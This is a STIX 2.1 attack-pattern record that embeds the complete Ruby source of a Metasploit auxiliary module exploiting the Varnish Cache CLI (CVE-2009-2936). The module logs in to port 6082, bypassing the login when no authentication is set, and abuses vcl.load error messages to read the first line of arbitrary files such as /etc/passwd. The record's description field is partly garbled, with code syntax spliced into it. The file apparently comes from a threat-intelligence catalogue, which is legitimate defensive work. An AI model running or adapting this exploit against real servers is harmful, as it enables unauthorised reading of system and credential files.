{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--48fbb5d2-bf4e-4d73-a39f-8f0fa09686d9",
    "created": "2024-08-14T16:26:32.033926Z",
    "modified": "2024-08-14T16:26:32.03393Z",
    "name": "Varnish Cache CLI File Read",
    "description": "This module attempts to read the first line of a file by abusing the error message when compiling a file with vcl.load.' 'References'     => [ [ 'OSVDB', '67670' ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/varnish/varnish_cli_file_read.rb",
            "external_id": "varnish_cli_file_read.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.varnish-cache.org/trac/wiki/CLI"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/tcp/client'\nrequire 'metasploit/framework/varnish/client'\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Metasploit::Framework::Varnish::Client\n\n  def initialize\n    super(\n      'Name'           => 'Varnish Cache CLI File Read',\n      'Description'    => 'This module attempts to read the first line of a file by abusing the error message when\n                           compiling a file with vcl.load.',\n      'References'     =>\n        [\n          [ 'OSVDB', '67670' ],\n          [ 'CVE', '2009-2936' ],\n          [ 'EDB', '35581' ],\n          [ 'URL', 'https://www.varnish-cache.org/trac/wiki/CLI' ]\n        ],\n      'Author'         =>\n        [\n          'patrick', #original module\n          'h00die <mike@shorebreaksecurity.com>' #updates and standardizations\n        ],\n      'License'         =>  MSF_LICENSE,\n      'DefaultOptions'  =>  {\n        'RPORT' => 6082\n      }\n    )\n\n    register_options(\n      [\n        OptString.new('PASSWORD',  [ false, 'Password for CLI.  No auth will be automatically detected', '' ]),\n        OptString.new('FILE',  [ false, 'File to read the first line of', '/etc/passwd' ])\n      ])\n  end\n\n  def run_host(ip)\n    # first check if we even need auth\n    begin\n      connect\n      challenge = require_auth?\n      close_session\n      disconnect\n      connect\n      if !challenge\n        print_good \"#{ip}:#{rport} - LOGIN SUCCESSFUL: No Authentication Required\"\n      else\n        if not login(datastore['PASSWORD'])\n          vprint_error \"#{ip}:#{rport} - Unable to Login\"\n          return\n        end\n      end\n      # abuse vcl.load to load a varnish config file and save it to a random variable.  This will fail to give us the first line in debug message\n      sock.get_once\n      sock.puts(\"vcl.load #{Rex::Text.rand_text_alphanumeric(3)} #{datastore['FILE']}\")\n      result = sock.get_once\n      if result && result =~ /Line \\d Pos \\d+\\)\\n(.*)/\n        vprint_good($1)\n      else\n        vprint_error(result) # will say something like \"Cannot open '/etc/shadow'\"\n      end\n      close_session\n      disconnect\n    rescue Rex::ConnectionError, EOFError, Timeout::Error\n      print_error \"#{ip}:#{rport} - Unable to connect\"\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}